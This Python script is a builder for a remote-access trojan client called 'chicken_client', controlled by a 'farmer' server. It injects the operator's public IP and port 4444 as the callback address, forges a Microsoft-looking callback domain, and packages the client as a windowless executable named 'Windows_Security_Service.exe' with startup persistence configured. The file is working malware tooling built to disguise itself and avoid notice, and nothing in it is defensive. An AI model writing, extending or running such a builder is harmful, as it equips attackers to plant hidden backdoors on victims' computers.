# build_client.py
import json
import subprocess
import os
import sys
import socket
import random

def get_public_ip():
    """Get the public IP using various services"""
    services = [
        'https://api.ipify.org',
        'https://ident.me',
        'https://checkip.amazonaws.com'
    ]
    
    for service in services:
        try:
            import requests
            ip = requests.get(service, timeout=5).text.strip()
            if ip and '.' in ip:
                return ip
        except:
            continue
    
    # Fallback: get local IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        local_ip = s.getsockname()[0]
        s.close()
        return local_ip
    except:
        return "127.0.0.1"

def generate_client_ip():
    """Generate a specialized IP or domain for client callback"""
    config = load_config()
    
    if config['server_ip'] == 'auto':
        public_ip = get_public_ip()
        
        # Create a subdomain-like string for obfuscation
        random_hash = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
        specialized_ip = f"update-{random_hash}.microsoft-security.{public_ip.replace('.', '-')}.com"
        
        return specialized_ip, public_ip
    else:
        return config['server_ip'], config['server_ip']

def load_config():
    """Load configuration from JSON"""
    try:
        with open('config.json', 'r') as f:
            return json.load(f)
    except:
        return {
            "server_ip": "auto",
            "server_port": 4444,  # Changed to 4444 to match farmer default
            "client_name": "Windows_Security_Service.exe",
            "persistence_method": "startup"
        }

def build_client():
    """Build the client executable with specialized configuration"""
    print("[*] Building specialized client...")
    
    config = load_config()
    specialized_ip, real_ip = generate_client_ip()
    port = config['server_port']
    
    # Read and modify client template
    with open('chicken_client.py', 'r', encoding='utf-8') as f:
        client_code = f.read()
    
    # Replace placeholders - THESE ARE THE CRITICAL FIXES
    # We now match the EXACT variable names from the final client code
    client_code = client_code.replace("SPECIALIZED_HOST = 'YOUR_SPECIALIZED_IP'", f"SPECIALIZED_HOST = '{specialized_ip}'")
    client_code = client_code.replace("REAL_HOST = 'YOUR_REAL_IP'", f"REAL_HOST = '{real_ip}'")
    client_code = client_code.replace("PORT = YOUR_PORT", f"PORT = {port}")
    
    # Write modified client
    with open('chicken_client_compiled.py', 'w', encoding='utf-8') as f:
        f.write(client_code)
    
    # Build with PyInstaller
    try:
        cmd = [
            sys.executable, "-m", "PyInstaller", 
            "--onefile", "--noconsole", "--name", config['client_name'],
            "chicken_client_compiled.py"
        ]
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"[+] Client built: dist/{config['client_name']}")
            print(f"[+] Callback URL: {specialized_ip}:{port}")
            # Save the specialized IP to config for the farmer
            try:
                config['specialized_ip'] = specialized_ip
                with open('config.json', 'w') as f:
                    json.dump(config, f, indent=4)
                print("[+] Config updated with specialized IP.")
            except:
                print("[-] Could not update config file.")
            return True
        else:
            print(f"[-] Build error: {result.stderr}")
            return False
            
    except Exception as e:
        print(f"[-] Build failed: {e}")
        return False

if __name__ == "__main__":
    build_client()